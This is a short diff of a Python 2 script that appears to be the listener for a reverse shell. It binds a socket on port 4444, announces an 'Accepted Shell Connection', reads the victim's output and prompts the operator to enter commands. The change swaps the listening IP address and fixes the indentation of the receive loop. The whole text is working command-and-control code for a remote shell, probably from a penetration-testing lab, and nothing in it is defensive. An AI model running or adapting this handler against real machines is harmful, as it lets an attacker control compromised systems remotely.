@@ -1,7 +1,7 @@
 import socket
 import sys
 
-host = '172.30.1.3'
+host = '192.168.24.157'
 port = 4444
 server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 server.bind((host,port))
@@ -20,16 +20,16 @@ while 1:
     print "[*] Accepted Shell Connection"
     buffer = ""
 
-while 1:
-    try:
-        recv_buffer = client.recv(4096)
-        print "[*] Received: %s" % recv_buffer
-        if not len(recv_buffer):
+    while 1:
+        try:
+            recv_buffer = client.recv(4096)
+            print "[*] Received: %s" % recv_buffer
+            if not len(recv_buffer):
+                break
+            else:
+                buffer += recv_buffer
+        except:
             break
-        else:
-            buffer += recv_buffer
-    except:
-        break
 
 
 command = raw_input("Enter Command> ")
